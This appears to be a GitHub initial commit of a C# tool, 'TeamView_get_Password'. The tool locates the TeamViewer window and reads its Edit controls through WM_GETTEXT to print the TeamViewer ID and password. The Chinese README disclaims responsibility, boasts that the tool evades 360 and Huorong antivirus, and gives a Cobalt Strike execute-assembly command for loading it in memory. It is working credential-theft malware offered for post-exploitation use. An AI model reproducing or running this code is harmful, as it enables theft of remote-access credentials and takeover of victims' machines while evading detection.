055828a8f63d205c1e67905e5dfc5a4e1ae6858e
wafinfo <56339781+wafinfo@users.noreply.github.com>
2021-10-16 15:30:52 +0800

    Initial commit

---
+++ README.md
@@ -0,0 +1,13 @@
+<h1 align="center" >TeamView_get_Password</h1>
+
+##  👮🏻‍♀️ 免责声明
+
+由于传播、利用TeamView_get_Password工具提供的功能而造成的**任何直接或者间接的后果及损失**，均由使用者本人负责，本人**不为此承担任何责任**。
+
+
+##  使用介绍
+目前免杀某60，某绒等等
+![1.png](/1.png)
+
+## 支持CobaltStrike内存加载
+execute-assembly /path/to/TeamViewplay.exe
---
+++ TeamViewplay/Program.cs
@@ -0,0 +1,85 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace TeamViewplay
+{
+    class Program
+    {
+        static void Main(string[] args)
+
+
+        {
+            IntPtr hwnd = FindWindow(null, "TeamViewer");
+            if (hwnd != IntPtr.Zero)
+            {
+                Getwidows(hwnd);
+            }
+            else
+            {
+                Console.WriteLine("没有找到窗口");
+            }
+        }
+
+        public static void Getwidows(IntPtr  hwnd) {
+            IntPtr winPtr = GetWindow(hwnd, GetWindowCmd.GW_CHILD);
+            while (winPtr != IntPtr.Zero)
+            {
+                GetText(winPtr);
+                IntPtr temp = GetWindow(winPtr, GetWindowCmd.GW_CHILD);
+                winPtr = temp;
+            }
+        }
+
+        public static void GetText(IntPtr GetWind) {
+            IntPtr GetPtr = GetWindow(GetWind, GetWindowCmd.GW_HWNDNEXT);
+            while (GetPtr != IntPtr.Zero)
+            {
+                StringBuilder sb = new StringBuilder(1024);
+                GetClassName(GetPtr, sb, 1024);
+                if (sb.ToString().TrimEnd('\r', '\n') == "Edit")
+                {
+                    StringBuilder stringBuilder2 = new StringBuilder(1024);
+                    SendMessage(GetPtr, WM_GETTEXT, 1024, stringBuilder2);
+                    Console.WriteLine(stringBuilder2.ToString().TrimEnd('\r', '\n'));
+                }
+                Getwidows(GetPtr);
+                IntPtr  temp = GetWindow(GetPtr, GetWindowCmd.GW_HWNDNEXT);
+                GetPtr = temp;
+            }
+        }
+
+
+        enum GetWindowCmd : uint
+        {
+            GW_HWNDFIRST = 0,
+            GW_HWNDLAST = 1,
+            GW_HWNDNEXT = 2,
+            GW_HWNDPREV = 3,
+            GW_OWNER = 4,
+            GW_CHILD = 5,
+            GW_ENABLEDPOPUP = 6
+        }
+        public static int WM_GETTEXT = 0x000D;
+
+        [DllImport("user32.dll")]
+        public static extern bool DestroyWindow([System.Runtime.InteropServices.InAttribute()] System.IntPtr hWnd);
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "GetClassName")]
+        public static extern int GetClassName([System.Runtime.InteropServices.InAttribute()] System.IntPtr hWnd, System.Text.StringBuilder lpClassName, int nMaxCount);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr GetWindow(IntPtr hWnd, GetWindowCmd uCmd);
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "EnumWindows")]
+        public static extern System.IntPtr GetWindow([System.Runtime.InteropServices.InAttribute()] System.IntPtr hWnd, uint uCmd);
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("User32.dll", EntryPoint = "SendMessage")]
+        private static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, StringBuilder lParam);
+        [DllImport("User32.dll ")]
+        public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr childe, string strclass, string FrmText);
+
+
+    }
+
+}
+
+
